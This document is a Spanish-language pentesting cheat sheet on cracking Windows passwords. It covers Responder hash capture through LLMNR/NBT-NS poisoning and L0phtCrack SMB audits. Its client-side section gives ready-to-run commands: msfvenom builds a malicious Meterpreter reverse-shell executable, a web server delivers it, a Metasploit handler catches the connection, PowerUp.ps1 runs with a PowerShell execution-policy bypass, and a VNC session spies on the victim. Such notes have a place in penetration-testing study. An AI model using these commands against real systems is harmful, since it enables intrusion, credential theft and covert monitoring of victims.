# Active Attack to Crack the System's Password

Tags: #Hacking #SystemHacking #Responder #L0phtCrack #Exploit-DB 

## Exploit-DB

* [Exploit-DB](https://www.exploit-db.com/)

## Responder 

```bash 
❯ /home/Responder/logs       # Ruta en donde se almacenan los logs para ver los hashes de los usuarios 
```

```bash 
# Kali Tool 
❯ ./Responder.py -I eth0     # Es un servicio que se encuentra a la escucha de los diferentes protocolos como LLMR, NBT-NS, SMB, HTTP-Server, etc... esperando a que el usuario cometa un error buscando un recurso en la red que no existe. Esto con el fin de capturar los 'Hashes' de los usuarios para poder crackearlos offlinecon 'John The Ripper o Hashcat'
```

## L0phtCrack 

L0phtCrack es una **herramienta de auditoría y recuperación de contraseñas** (ahora llamada LC5), originalmente producida por Mudge de L0pht Heavy Industries. Es usada para verificar la debilidad de las contraseñas y algunas veces para recuperar las que se han olvidado o perdido en sistemas Microsoft Windows.

```bash 
# Windows Tool 
❯ L0phtCrack 7      # Ejecutar el programa 

Nota:
	1. Seleccionar 'Password Auditing Wizard'
	2. Seleccionar 'Windows Import From Remote Machine (SMB)', colocar las credenciales y el dominio valido en 'Use Specific User Credentials'
	3. Seleccionar 'Thorough Password Audit' 
	4. Marcar 'Generate Report at End of Auditing' en formato CSV y seleccionar la ubicación de descarga
	5. Al momento de dar click en 'Finish', el programa empezará a ejecutarse 
```

## Client-Side VNC Session 

```bash 
# Kali Tool 
❯ msfvenom -p windows/meterpreter/reverse_tcp --plataform windows -a x86 -f exe LHOST=IP LPORT=443 -o test.exe       # Crear un archivo malicioso 

❯ python3 -m http.server 80        # Crear un servidor para compartir el archivo 

❯ msfconsole -q 
	❯ use exploit/multi/handler   
	❯ options 
	❯ set LPORT 443
	❯ set LHOST IP
	❯ set payload windows/meterpreter/reverse_tcp
	❯ run 

❯ upload /home/PowerUP.ps1   # Cargar un archivo desde la maquna Kali en la sesión establecida con Meterpreter 
❯ shell                      # Crear una sesión Windows en Meterpreter 
	❯ powershell -ExecutionPolicy Bypass -Command . .\PowerUp.ps1;Invoke-AllChecks  # Ejecutar el archivo 'PowerUp.ps1'
	❯ exit 

❯ run vnc     # Crear un sesión de VNC en Meterpreter y sirve para visualizar lo que pasa en la maquina victima 
```